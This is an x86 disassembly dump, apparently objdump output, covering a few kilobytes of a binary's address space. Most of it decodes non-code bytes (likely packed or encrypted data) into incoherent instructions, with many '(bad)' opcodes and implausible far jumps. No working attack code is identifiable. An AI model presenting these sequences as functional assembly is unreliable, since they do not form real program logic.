  42898b:	sbb    esp,DWORD PTR [esi-0x3c]
  42898e:	xchg   ebp,eax
  42898f:	addr16 js 0x4289dc
  428992:	and    al,0x8d
  428994:	add    DWORD PTR [ecx-0x1c],ecx
  428997:	mov    esp,edx
  428999:	les    edx,FWORD PTR [ebx]
  42899b:	push   ds
  42899c:	aad    0x2a
  42899e:	inc    ebp
  42899f:	imul   edi,DWORD PTR [ebx],0xb83ab755
  4289a5:	je     0x428a04
  4289a7:	cli    
  4289a8:	push   esi
  4289a9:	leave  
  4289aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289ab:	adc    BYTE PTR [eax+0x1c72e621],bl
  4289b1:	inc    esp
  4289b2:	mov    ecx,0x1ab0616d
  4289b7:	sub    edx,DWORD PTR [esi+0x75]
  4289ba:	pop    ss
  4289bb:	mov    ds:0x2708bb44,al
  4289c0:	inc    ebx
  4289c1:	jno    0x4289b3
  4289c3:	jg     0x428945
  4289c5:	and    DWORD PTR [eax-0x30],eax
  4289c8:	mov    ch,0xa7
  4289ca:	ds sbb cl,bl
  4289cd:	mov    ebx,gs
  4289cf:	lock cmp DWORD PTR [eax+0xe8ec12b],eax
  4289d6:	adc    DWORD PTR [ebp+0x33],ebx
  4289d9:	lock pop es
  4289db:	push   0xed5f603
  4289e0:	mov    ?,WORD PTR [eax-0x13]
  4289e3:	mov    ah,0x50
  4289e5:	in     al,dx
  4289e6:	cmp    eax,0xe046b056
  4289eb:	sub    ah,0x76
  4289ee:	in     eax,dx
  4289ef:	test   eax,esi
  4289f1:	mov    ds:0xa5c7604b,al
  4289f6:	shr    BYTE PTR [edi-0x5b4171ca],0x85
  4289fd:	rcr    BYTE PTR [esi],0x56
  428a00:	push   0x5023cbcc
  428a05:	jno    0x4289da
  428a07:	jmp    0x58a5c207
  428a0c:	call   0xac78e587
  428a11:	or     eax,0x97a60771
  428a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a17:	pop    es
  428a18:	push   esp
  428a19:	sub    ecx,DWORD PTR [edx+edx*2]
  428a1c:	cmp    BYTE PTR [ebp+0x57],0x3d
  428a20:	jb     0x4289d8
  428a22:	or     al,0xa8
  428a24:	adc    DWORD PTR [edi+0x64],ebx
  428a27:	call   0x1c73:0x4e78260e
  428a2e:	enter  0x4321,0xb0
  428a32:	shl    ah,cl
  428a34:	stc    
  428a35:	retf   0xb5f3
  428a38:	jl     0x4289c3
  428a3a:	clc    
  428a3b:	adc    eax,0x83f7a0eb
  428a40:	dec    esp
  428a41:	fwait
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0xef6ef691
  428ac2:	xor    BYTE PTR [edi+0x1b04e],bh
  428ac8:	test   BYTE PTR [eax],0x0
  428acb:	add    BYTE PTR [edi],al
  428acd:	jl     0x428b30
  428acf:	xlat   BYTE PTR ds:[ebx]
  428ad0:	and    DWORD PTR [esi-0x62],edx
  428ad3:	arpl   WORD PTR [edi-0x27d5db],cx
  428ad9:	push   es
  428ada:	xor    DWORD PTR [ebp-0x45e74678],0x4f
  428ae1:	mov    cl,0xd4
  428ae3:	icebp  
  428ae4:	outs   dx,BYTE PTR gs:[esi]
  428ae6:	enter  0x6f14,0x83
  428aea:	(bad)  
  428aeb:	sbb    BYTE PTR [ebx+0x4],ch
  428aee:	popa   
  428aef:	push   esi
  428af0:	pop    si
  428af2:	ret    
  428af3:	out    dx,eax
  428af4:	jg     0x428b44
  428af6:	mov    es,WORD PTR [ebp-0x3c]
  428af9:	bsf    ebx,DWORD PTR [eax]
  428afc:	sbb    al,BYTE PTR [ecx]
  428afe:	cmp    ecx,DWORD PTR [esi]
  428b00:	test   DWORD PTR [edi],edi
  428b02:	fistp  QWORD PTR [esi+ecx*4-0x2be96680]
  428b09:	popa   
  428b0a:	out    dx,eax
  428b0b:	in     eax,dx
  428b0c:	push   ss
  428b0d:	xchg   esi,eax
  428b0e:	and    ah,BYTE PTR [ebp-0x61ae1eb6]
  428b14:	xchg   ebx,eax
  428b15:	pushf  
  428b16:	test   DWORD PTR [edi+0x26],0xcc2cc086
  428b1d:	sbb    DWORD PTR [eax],0x5f
  428b20:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b22:	fsubr  QWORD PTR [esi+0x7b0cc249]
  428b28:	ins    DWORD PTR es:[edi],dx
  428b29:	push   edi
  428b2a:	mov    BYTE PTR [edi],0x25
  428b2d:	fadd   DWORD PTR [ecx+0x27deef6a]
  428b33:	frstor [edi]
  428b35:	xchg   edi,eax
  428b36:	call   0x24ea:0xe77a05e3
  428b3d:	and    esi,edi
  428b3f:	inc    ebp
  428b40:	sahf   
  428b41:	cwde   
  428b42:	xor    eax,0x66d44a3c
  428b47:	sbb    DWORD PTR [ebx-0x1fd3566],esp
  428b4d:	pop    es
  428b4e:	icebp  
  428b4f:	sbb    DWORD PTR [eax-0x27],0xfffffffb
  428b53:	pop    edi
  428b54:	cmp    BYTE PTR [ebp-0x6c],0x70
  428b58:	pop    es
  428b59:	aas    
  428b5a:	mov    ch,0x1c
  428b5c:	mov    esp,0x4e7fc9e
  428b61:	pop    ecx
  428b62:	popa   
  428b63:	mov    ecx,0xbc9e4d0b
  428b68:	xor    dh,BYTE PTR [edi-0x6ca9894]
  428b6e:	js     0x428b2c
  428b70:	add    BYTE PTR [ebx-0x3682b9eb],dl
  428b76:	(bad)  
  428b77:	mov    dh,0xc6
  428b79:	jnp    0x428b2d
  428b7b:	mov    edi,0xc35097ef
  428b80:	mov    edx,0x47c2c358
  428b85:	and    edi,DWORD PTR [ebp-0x75]
  428b88:	push   ebx
  428b89:	call   0x852e:0xeda6c778
  428b90:	add    al,0xb5
  428b92:	call   DWORD PTR [eax-0x7141bfe9]
  428b98:	ret    
  428b99:	push   esp
  428b9a:	and    eax,0xdeabb0b5
  428b9f:	fst    QWORD PTR [eax+0x539201a4]
  428ba5:	and    al,0x84
  428ba7:	xor    ebx,DWORD PTR [esi-0x39ffad06]
  428bad:	mov    ah,0xe9
  428baf:	dec    esp
  428bb0:	xchg   ecx,esi
  428bb2:	sub    cl,dh
  428bb4:	push   edi
  428bb5:	test   BYTE PTR [esi+0x29],ch
  428bb8:	inc    edi
  428bb9:	(bad)  
  428bba:	shl    BYTE PTR [ecx+0x39f3b8e],cl
  428bc0:	dec    ecx
  428bc1:	cmp    al,BYTE PTR [eax]
	...
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x9fd7a28f
  428c41:	cmp    al,0x93
  428c43:	stc    
  428c44:	inc    esp
  428c45:	mov    cl,0x1
  428c47:	add    dh,dh
  428c49:	add    BYTE PTR [eax],al
  428c4b:	add    BYTE PTR [ebp-0x1a857346],dh
  428c51:	xor    BYTE PTR [edi],al
  428c53:	jno    0x428bf8
  428c55:	sar    DWORD PTR [ebp+0x30],cl
  428c58:	in     eax,dx
  428c59:	sar    BYTE PTR [ebx+eiz*2-0x39],0x25
  428c5e:	ins    DWORD PTR es:[edi],dx
  428c5f:	(bad)  
  428c60:	int3   
  428c61:	(bad)  
  428c62:	pop    esp
  428c63:	push   ebx
  428c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c65:	(bad)  
  428c67:	and    DWORD PTR [ebp-0xb],eax
  428c6a:	xchg   edi,eax
  428c6b:	or     BYTE PTR [ebx+0x686a930e],ch
  428c71:	push   edi
  428c72:	mov    ah,0x87
  428c74:	ds push edi
  428c76:	lods   al,BYTE PTR ss:[esi]
  428c78:	push   ebp
  428c79:	mov    bl,0x42
  428c7b:	or     ah,0xbf
  428c7e:	jne    0x428c20
  428c80:	ror    DWORD PTR [edi],0x86
  428c83:	mov    cl,0xcb
  428c85:	scas   al,BYTE PTR es:[edi]
  428c86:	push   cs
  428c87:	(bad)
  428c8a:	daa    
  428c8b:	add    esi,DWORD PTR [edi-0x44]
  428c8e:	mov    dh,0xe2
  428c90:	push   esi
  428c91:	mov    eax,0x3aff89ce
  428c96:	div    BYTE PTR [ecx+0x3f]
  428c99:	aaa    
  428c9a:	je     0x428cc7
  428c9c:	push   edx
  428c9d:	ins    BYTE PTR es:[edi],dx
  428c9e:	(bad)  
  428c9f:	rol    bh,cl
  428ca1:	push   es
  428ca2:	dec    edx
  428ca3:	push   0x67a2a779
  428ca8:	loope  0x428ce6
  428caa:	dec    ebx
  428cab:	cmp    al,ah
  428cad:	clc    
  428cae:	mov    edi,eax
  428cb0:	cmp    ecx,edx
  428cb2:	aaa    
  428cb3:	aam    0xf2
  428cb5:	scas   al,BYTE PTR es:[edi]
  428cb6:	adc    al,BYTE PTR [edi]
  428cb8:	jmp    0x7634c085
  428cbd:	rol    BYTE PTR ds:0x92265497,cl
  428cc3:	fcmovnb st,st(4)
  428cc5:	jns    0x428ce5
  428cc7:	sbb    al,0x27
  428cc9:	pop    ecx
  428cca:	mov    dl,0xba
  428ccc:	fwait
  428ccd:	push   0xe16535d5
  428cd2:	aam    0xe
  428cd4:	aas    
  428cd5:	addr16 pop esi
  428cd7:	push   esp
  428cd8:	outs   dx,DWORD PTR ds:[esi]
  428cd9:	iret   
  428cda:	imul   edx,DWORD PTR [esi-0x1d50d598],0xa9b0e754
  428ce4:	jle    0x428d5b
  428ce6:	push   es
  428ce7:	repnz mov DWORD PTR [eax+ebx*2-0x1d],esp
  428cec:	sub    al,ah
  428cee:	xchg   edi,eax
  428cef:	mov    cl,BYTE PTR [esi]
  428cf1:	jmp    DWORD PTR [ebp-0x3d169fb]
  428cf7:	iret   
  428cf8:	inc    esp
  428cf9:	retf   0x9fa7
  428cfc:	shl    DWORD PTR [esi],0x47
  428cff:	mov    ebx,0x53299769
  428d04:	out    dx,al
  428d05:	cli    
  428d06:	and    BYTE PTR [eax-0x6d],al
  428d09:	mov    WORD PTR [ebx+eiz*1-0x4c86fd67],gs
  428d10:	arpl   WORD PTR [ecx+0x4f6f645],sp
  428d16:	scas   eax,DWORD PTR es:[edi]
  428d17:	into   
  428d18:	(bad)  
  428d19:	fisubr DWORD PTR [eax+0x28777abb]
  428d1f:	adc    esp,ecx
  428d21:	xor    ecx,DWORD PTR [eax+edi*8+0x3cb5ae45]
  428d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428d29:	test   BYTE PTR [edi-0x3e],ch
  428d2c:	push   ss
  428d2d:	movntps XMMWORD PTR [esp+edi*1+0x6f],xmm2
  428d32:	push   cs
  428d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d34:	fs adc al,0x3d
  428d37:	add    al,0xee
  428d39:	adc    DWORD PTR [edi-0x78a9b45],edx
  428d3f:	outs   dx,BYTE PTR ds:[esi]
  428d40:	push   ds
  428d41:	pop    ecx
	...
  428db2:	add    BYTE PTR [eax],al
  428db4:	mov    eax,0x6d3c25f1
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0x5f09d3ac
  428dc4:	cmp    dh,BYTE PTR [edx+0xf60001]
  428dca:	add    BYTE PTR [eax],al
  428dcc:	inc    esp
  428dcd:	jge    0x428e47
  428dcf:	inc    esp
  428dd0:	xor    eax,0x32c3b604
  428dd5:	xchg   edx,eax
  428dd6:	pusha  
  428dd7:	(bad)  
  428dd9:	test   BYTE PTR [ebx+ecx*8+0xe83bbf2],al
  428de0:	and    BYTE PTR [esi+esi*8-0x6a30967e],cl
  428de7:	popf   
  428de8:	enter  0x2694,0xfa
  428dec:	iret   
  428ded:	jnp    0x428e3c
  428def:	pop    ss
  428df0:	or     al,0x69
  428df2:	and    ebp,DWORD PTR [esi-0x4b]
  428df5:	rcl    BYTE PTR [esp+edx*1-0x2441278f],1
  428dfc:	hlt    
  428dfd:	pop    esi
  428dfe:	aaa    
  428dff:	test   eax,0x148b3763
  428e04:	sub    ebp,DWORD PTR [edx]
  428e06:	(bad)  
  428e07:	pushf  
  428e08:	inc    esp
  428e09:	in     al,0xec
  428e0b:	adc    esi,edx
  428e0d:	pop    esi
  428e0e:	mov    eax,ds:0xbd56748e
  428e13:	int3   
  428e14:	xor    ch,BYTE PTR [edi-0x2e]
  428e17:	cmp    bl,BYTE PTR ds:0x9a10560b
  428e1d:	in     eax,dx
  428e1e:	add    al,0xb6
  428e20:	inc    esi
  428e21:	xor    eax,0xe56538fc
  428e26:	push   eax
  428e28:	mov    ds:0x62d52e47,eax
  428e2d:	xchg   eax,ecx
  428e2f:	xchg   ecx,eax
  428e30:	popa   
  428e31:	cmp    DWORD PTR [ebx+0x6d],ebx
  428e34:	adc    BYTE PTR [edi+ebx*1],bh
  428e37:	or     DWORD PTR [edi-0x4],edi
  428e3a:	pop    edi
  428e3b:	adc    al,0x51
  428e3d:	inc    esi
  428e3e:	jnp    0x428e0c
  428e40:	pop    ebx
  428e41:	sbb    WORD PTR [esi],0x14
  428e45:	or     dl,BYTE PTR [edx+0x32bdd745]
  428e4b:	pushf  
  428e4c:	adc    DWORD PTR ds:0xe6d79751,edx
  428e52:	mov    esi,0x9fb0319b
  428e57:	sub    DWORD PTR [edi-0x14],ebx
  428e5a:	sti    
  428e5b:	adc    DWORD PTR [ebx+ebx*2-0x7d7222e0],eax
  428e62:	jl     0x428e9c
  428e64:	dec    edi
  428e65:	mov    ah,0x9d
  428e67:	pop    esi
  428e68:	add    DWORD PTR [ebx+0x36631903],edi
  428e6e:	push   ds
  428e6f:	inc    esp
  428e70:	sub    BYTE PTR [ecx-0x482ab7bf],bl
  428e76:	fmul   st(7),st
  428e78:	jp     0x428e03
  428e7a:	xor    DWORD PTR [ebx],0xf65fa809
  428e80:	dec    edi
  428e81:	cmp    DWORD PTR [eax],ebp
  428e83:	int3   
  428e84:	jecxz  0x428e9f
  428e86:	outs   dx,DWORD PTR ds:[esi]
  428e87:	mov    edi,0x93a7c481
  428e8c:	and    DWORD PTR [ecx+ecx*1-0x18],edx
  428e90:	dec    esp
  428e91:	and    BYTE PTR [ecx+0x7ee2e6fd],bh
  428e97:	cmc    
  428e98:	or     DWORD PTR [ecx+edx*2],esi
  428e9b:	(bad)  
  428e9c:	(bad)  
  428e9d:	in     eax,0x45
  428e9f:	add    esi,DWORD PTR ds:0xd68eff5
  428ea5:	pop    ecx
  428ea6:	adc    DWORD PTR [eax+ebx*1],ebx
  428ea9:	lods   eax,DWORD PTR ds:[esi]
  428eaa:	fwait
  428eab:	outs   dx,BYTE PTR ds:[esi]
  428eac:	cmp    al,0x58
  428eae:	stos   DWORD PTR es:[edi],eax
  428eaf:	out    dx,eax
  428eb0:	adc    al,0x80
  428eb2:	sub    bh,BYTE PTR [eax-0x7b]
  428eb5:	xchg   edx,eax
  428eb6:	jo     0x428ec1
  428eb8:	lods   eax,DWORD PTR ds:[esi]
  428eb9:	pop    ecx
  428eba:	imul   ebx,DWORD PTR ds:0x6239a58a,0x43
  428ec1:	sub    al,0x0
	...
  428f33:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	mov    ecx,0x30bedfd0
  428f45:	mov    bl,0x1
  428f47:	add    dh,dh
  428f49:	add    BYTE PTR [eax],al
  428f4b:	add    BYTE PTR [eax],cl
  428f4d:	or     dh,BYTE PTR [eax]
  428f4f:	loop   0x428f34
  428f51:	jge    0x428f3d
  428f53:	pop    es
  428f54:	mov    bl,0xda
  428f56:	inc    esp
  428f57:	cld    
  428f58:	call   0x21305e59
  428f5d:	jmp    0x428f31
  428f5f:	in     eax,dx
  428f60:	fdivr  QWORD PTR [eax]
  428f62:	(bad)
  428f65:	pop    ebx
  428f66:	xchg   ecx,eax
  428f67:	sbb    DWORD PTR [edx+0x20],edx
  428f6a:	rcl    BYTE PTR es:[esi+0x6b2a228a],1
  428f71:	and    ch,BYTE PTR [eax]
  428f73:	jle    0x428fd9
  428f75:	or     edi,DWORD PTR [esi+0x32f44848]
  428f7b:	sti    
  428f7c:	mov    ah,0xf6
  428f7e:	dec    edi
  428f7f:	cmp    ch,BYTE PTR [esi+0x30fd1687]
  428f85:	add    al,0x69
  428f87:	pop    ebx
  428f88:	movsx  edi,WORD PTR [ebx+0x2f7a6fd4]
  428f8f:	pop    ebp
  428f90:	rol    BYTE PTR [ecx-0x3a],cl
  428f93:	lahf   
  428f94:	adc    eax,0x3de33ce9
  428f99:	and    BYTE PTR [edi],0x51
  428f9c:	sbb    ch,0x52
  428f9f:	popa   
  428fa0:	mov    BYTE PTR [edi+esi*4],al
  428fa3:	rcr    eax,1
  428fa5:	sub    eax,0xfa85c302
  428faa:	sti    
  428fab:	ins    DWORD PTR es:[edi],dx
  428fac:	xor    al,0xad
  428fae:	dec    ecx
  428faf:	cmp    DWORD PTR [ebx+ebp*2+0x2d5ef04b],esp
  428fb6:	jb     0x428fac
  428fb8:	retf   
  428fb9:	mov    ebx,ebp
  428fbb:	sbb    esi,edi
  428fbd:	not    esp
  428fbf:	scas   al,BYTE PTR es:[edi]
  428fc0:	int3   
  428fc1:	push   ebp
  428fc2:	ins    BYTE PTR es:[edi],dx
  428fc3:	popa   
  428fc4:	sub    ch,BYTE PTR [edx-0x6afa8f9c]
  428fca:	sub    bl,BYTE PTR [edi]
  428fcc:	cmp    eax,0xaf94f110
  428fd1:	aaa    
  428fd2:	cli    
  428fd3:	adc    edi,ebp
  428fd5:	lds    ebp,FWORD PTR [edx+eiz*1+0x5840588f]
  428fdc:	sbb    BYTE PTR [eax+0x2e536056],dl
  428fe2:	mov    al,ds:0x5b448c13
  428fe7:	sti    
  428fe8:	jecxz  0x429037
  428fea:	repz (bad) 
  428fec:	call   0x11bb3a45
  428ff1:	inc    ecx
  428ff2:	and    ebp,ecx
  428ff4:	repnz int3 
  428ff6:	push   ss
  428ff7:	xchg   esp,eax
  428ff8:	and    al,0x3d
  428ffa:	or     ah,BYTE PTR [esi]
  428ffc:	adc    al,0x5f
  428fff:	out    dx,al
  429000:	fmul   DWORD PTR [edx]
  429002:	dec    edx
  429003:	mov    eax,ds:0x235da210
  429008:	fs dec ebp
  42900a:	or     DWORD PTR [edx],edi
  42900c:	jne    0x42905c
  42900e:	sub    bl,cl
  429010:	add    al,0x38
  429012:	or     al,0x1a
  429014:	mov    edx,0x8bf53f94
  429019:	test   BYTE PTR [esi-0x4f],0xd
  42901d:	aad    0x3c
  42901f:	les    esi,FWORD PTR [esi]
  429021:	dec    eax
  429022:	jmp    0x4dbc:0xdfd3eea8
  429029:	mov    BYTE PTR [eax+0x2b6d0768],ch
  42902f:	push   edi
  429030:	gs fmulp st(1),st
  429033:	push   esi
  429034:	sar    edi,cl
  429036:	mov    dl,0xb1
  429038:	hlt    
  429039:	data16 and al,dh
  42903c:	mov    ds,WORD PTR [edx]
  42903e:	push   ebx
  42903f:	mov    esi,0xf7f
	...
  4290b4:	fucomip st,st(6)
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0xb7b66cf7
  4290c1:	shl    esi,1
  4290c3:	push   esi
  4290c4:	es mov ah,0x1
  4290c7:	add    dh,dh
  4290c9:	add    BYTE PTR [eax],al
  4290cb:	add    bh,al
  4290cd:	test   edx,eax
  4290cf:	mov    dl,0x90
  4290d1:	popa   
  4290d2:	add    ebx,esi
  4290d4:	add    DWORD PTR [ecx],ecx
  4290d6:	and    eax,0x299066b9
  4290db:	loop   0x4290a2
  4290dd:	cmp    DWORD PTR [ebx-0x662cf92],0x5
  4290e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290e5:	cs cwde 
  4290e7:	loopne 0x4290a9
  4290e9:	lock xchg ch,bh
  4290ec:	mov    esi,0x7d2bcdd0
  4290f1:	(bad)  
  4290f2:	add    BYTE PTR [ebx+0x3a],bl
  4290f5:	ja     0x42913e
  4290f7:	jle    0x429150
  4290f9:	imul   ebp,eax,0x2acc599f
  4290ff:	dec    esi
  429101:	neg    BYTE PTR [ecx]
  429103:	fcom   QWORD PTR [edi+0x5e]
  429106:	popa   
  429107:	mov    cl,0x0
  429109:	lods   al,BYTE PTR ds:[esi]
  42910a:	cmp    esi,DWORD PTR [eax+ebx*8]
  42910d:	loopne 0x429160
  42910f:	hlt    
  429110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429111:	xor    bh,BYTE PTR [esp+ebx*2]
  429114:	out    dx,al
  429115:	pop    ebp
  429116:	jmp    0x310:0x601f9a04
  42911d:	pop    es
  42911e:	sub    bl,BYTE PTR [ebp+ebx*1-0x14]
  429122:	cmp    al,0xe5
  429124:	or     DWORD PTR [ebx+0x33274401],edi
  42912a:	push   ebp
  42912b:	ins    BYTE PTR es:[edi],dx
  42912c:	fisubr WORD PTR [edx+0xb]
  42912f:	pop    esp
  429130:	add    eax,0xc83e4bec
  429135:	fidiv  DWORD PTR [edx]
  429137:	push   edi
  429138:	pop    es
  429139:	adc    DWORD PTR [eax-0x4a],ebx
  42913c:	pusha  
  42913d:	cmp    eax,0x1c10d7f2
  429142:	(bad)  
  429143:	std    
  429144:	lods   eax,DWORD PTR ds:[esi]
  429145:	std    
  429146:	out    dx,al
  429147:	mov    ecx,0x1e0a7afd
  42914c:	push   ss
  42914d:	jmp    0x7bc:0x3aa9477d
  429154:	adc    ah,BYTE PTR [edx+0x222b0313]
  42915a:	in     al,0x97
  42915c:	es mov ebp,0x76aa9c5d
  429162:	xor    al,0x6f
  429164:	fwait
  429165:	mov    ss,ebx
  429167:	in     al,dx
  429168:	sub    al,0x59
  42916a:	push   edx
  42916b:	mov    al,ds:0x36dff818
  429170:	ja     0x429117
  429172:	xlat   BYTE PTR ds:[ebx]
  429173:	xor    bh,ah
  429175:	cmp    eax,0xed735503
  42917a:	inc    ebp
  42917b:	xor    al,0x59
  42917d:	aas    
  42917e:	loopne 0x42912e
  429180:	inc    ebx
  429181:	push   edi
  429182:	inc    esi
  429183:	into   
  429184:	test   BYTE PTR [ebp+0x1e],dh
  429187:	test   DWORD PTR [ebx],esp
  429189:	sub    eax,0x8bdfcb83
  42918e:	aad    0x5b
  429190:	mov    esi,ebx
  429192:	pop    eax
  429193:	(bad)  
  429194:	push   edx
  429195:	not    eax
  429197:	pop    ebx
  429198:	mov    eax,ds:0xcf95265c
  42919d:	scas   al,BYTE PTR es:[edi]
  42919e:	sub    eax,0xdcbcc5ad
  4291a3:	xor    DWORD PTR [ebx],eax
  4291a5:	or     eax,0x284f7b88
  4291aa:	fsubr  DWORD PTR [eax-0x55cf3a35]
  4291b0:	call   0x3c5559b7
  4291b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4291b6:	mov    ecx,0x2a2485d1
  4291bb:	loopne 0x429234
  4291bd:	nop
  4291be:	add    dl,BYTE PTR [eax]
  4291c0:	mov    eax,0xdb
	...
  429231:	add    BYTE PTR [eax],al
  429233:	add    bh,al
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	dec    esp
  429241:	loop   0x4291c5
  429243:	or     al,0x1c
  429245:	mov    ch,0x1
  429247:	add    dh,dh
  429249:	add    BYTE PTR [eax],al
  42924b:	add    BYTE PTR [esp+esi*1+0x2f],ah
  42924f:	pop    esp
  429250:	retf   
  429251:	and    esp,DWORD PTR [eax]
  429253:	loopne 0x429246
  429255:	sar    al,cl
  429257:	xchg   ebp,eax
  429258:	je     0x42929b
  42925a:	pop    edi
  42925b:	aas    
  42925c:	fwait
  42925d:	mov    bl,ah
  42925f:	jge    0x429258
  429261:	pusha  
  429262:	loop   0x4292c4
  429264:	jmp    0xe22cb9f6
  429269:	or     al,0x8f
  42926b:	mov    eax,0x48a3cf30
  429270:	and    DWORD PTR [esi-0x107c32b0],ebp
  429276:	push   esp
  429277:	les    ebx,FWORD PTR [esi+0x74536cf]
  42927d:	adc    dl,BYTE PTR [edx+0x14e24800]
  429283:	inc    DWORD PTR ds:0x404c1bbe
  429289:	fidivr DWORD PTR ds:0xf824df3
  42928f:	cwde   
  429290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429291:	adc    ecx,DWORD PTR [eax-0x12]
  429294:	fdivr  DWORD PTR [esp+esi*8-0x23081616]
  42929b:	or     al,0x31
  42929d:	adc    BYTE PTR [esi-0xaa52bc3],ch
  4292a3:	xchg   esi,eax
  4292a4:	push   ebp
  4292a5:	and    eax,0x1b59d0ac
  4292aa:	jmp    eax
  4292ac:	bound  ebx,QWORD PTR [ebx+ebx*2-0x5077b7bf]
  4292b3:	aaa    
  4292b4:	sbb    eax,0x851d366a
  4292b9:	popf   
  4292ba:	popf   
  4292bb:	xlat   BYTE PTR ds:[ebx]
  4292bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292bd:	hlt    
  4292be:	cli    
  4292bf:	inc    ebp
  4292c0:	sub    eax,0x5bf36bf1
  4292c5:	or     BYTE PTR [edi-0x3da1ac62],bh
  4292cb:	addr16 xchg edx,eax
  4292cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292ce:	dec    edi
  4292cf:	mov    bh,ch
  4292d1:	mov    ebx,DWORD PTR [edx]
  4292d3:	lds    esi,FWORD PTR [ecx+0x165c1420]
  4292d9:	repz imul ecx,DWORD PTR [eax-0x2],0x59cad9c5
  4292e1:	(bad)  
  4292e3:	shl    DWORD PTR [ebx-0x22],0x94
  4292e7:	or     dh,dh
  4292e9:	xor    bh,bh
  4292eb:	xor    ebp,edi
  4292ed:	lahf   
  4292ee:	js     0x429357
  4292f0:	leave  
  4292f1:	or     bl,ch
  4292f3:	mov    esi,0xb2ac476c
  4292f8:	cmp    DWORD PTR [ebx-0x6f],ebx
  4292fb:	or     DWORD PTR [edx-0x60db8ac9],edi
  429301:	popa   
  429302:	jns    0x4292de
  429304:	jmp    FWORD PTR [ebp-0x5f]
  429307:	scas   eax,DWORD PTR es:[edi]
  429308:	std    
  429309:	mov    edx,0x42f26b34
  42930e:	inc    eax
  42930f:	jg     0x4292d6
  429311:	hlt    
  429312:	sub    DWORD PTR [eax+ecx*2+0xb],ecx
  429316:	fdivr  DWORD PTR [ecx+0x4c]
  429319:	xor    ebp,edx
  42931b:	dec    edi
  42931c:	mov    dl,al
  42931e:	aaa    
  42931f:	xchg   ecx,eax
  429320:	sbb    ecx,edi
  429322:	fwait
  429323:	sbb    ecx,DWORD PTR [ecx+0x5a4ce3a3]
  429329:	add    eax,0x68b5640a
  42932e:	mov    ch,0xda
  429330:	cmp    eax,0xb132d52e
  429335:	cdq    
  429336:	xchg   ebx,eax
  429337:	or     BYTE PTR [edi+0x5],0x61
  42933b:	mov    ebx,0xfd4396a3
  429340:	(bad)
	...
  4293b3:	add    BYTE PTR [esi],cl
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	lock add DWORD PTR [ecx-0xc],0x12
  4293c5:	mov    dh,0x1
  4293c7:	add    dh,dh
  4293c9:	add    BYTE PTR [eax],al
  4293cb:	add    BYTE PTR [edx],dh
  4293cd:	push   esp
  4293ce:	test   BYTE PTR [ebx+0x1f],ch
  4293d1:	mov    ecx,0xc666a498
  4293d6:	mov    bh,0x8e
  4293d8:	mov    edi,0x9efb795
  4293dd:	clc    
  4293de:	inc    DWORD PTR [ebp-0x2eab923d]
  4293e4:	sub    al,0xb1
  4293e6:	hlt    
  4293e7:	loop   0x429410
  4293e9:	and    BYTE PTR [edi],al
  4293eb:	pop    ss
  4293ec:	xchg   DWORD PTR [eax],esi
  4293ee:	ss jp  0x42938c
  4293f1:	or     esp,DWORD PTR [eax+0xb]
  4293f4:	xor    DWORD PTR [edi+0x75],ebp
  4293f7:	pop    ds
  4293f8:	inc    esp
  4293f9:	add    BYTE PTR ds:0x57bcee69,0x45
  429400:	inc    ebx
  429401:	adc    al,0x8e
  429403:	cdq    
  429404:	sub    dh,BYTE PTR [edx]
  429406:	or     edi,DWORD PTR [ebx+eax*1+0x6e]
  42940a:	cmp    DWORD PTR [edi+0x6933aede],ebx
  429410:	cmp    eax,0xfa5233fe
  429415:	test   eax,ecx
  429417:	call   0x9763:0x8716971e
  42941e:	pop    edi
  42941f:	xchg   esp,eax
  429420:	cld    
  429421:	aas    
  429422:	ret    0x5b1d
  429425:	mov    esi,0xd19335e
  42942a:	pavgw  mm5,QWORD PTR [edx+0x4a]
  42942e:	clc    
  42942f:	push   ds
  429430:	sbb    dh,dl
  429432:	rcr    DWORD PTR [ecx-0x1e44680e],cl
  429438:	hlt    
  429439:	enter  0xcdce,0x96
  42943d:	std    
  42943e:	popa   
  42943f:	call   0x478b0fbf
  429444:	cmp    eax,0xc2824d8
  429449:	(bad)  
  42944a:	into   
  42944b:	add    bl,bh
  42944d:	inc    esp
  42944e:	icebp  
  42944f:	in     eax,0x64
  429451:	les    eax,FWORD PTR [ebx]
  429453:	test   DWORD PTR [ebp+0x2c],ebx
  429456:	jae    0x42945e
  429458:	dec    edi
  429459:	add    DWORD PTR [esi+ebp*4-0x6d2a859a],0x58
  429461:	je     0x42949b
  429463:	(bad)  
  429464:	adc    ebp,esi
  429466:	mov    ?,WORD PTR [ecx]
  429468:	(bad)  
  429469:	fld    QWORD PTR [esi+0x67]
  42946c:	fadd   st,st(3)
  42946e:	mov    edi,0xe2d13e55
  429473:	xchg   DWORD PTR cs:[eax+0x3e6d6fd3],esi
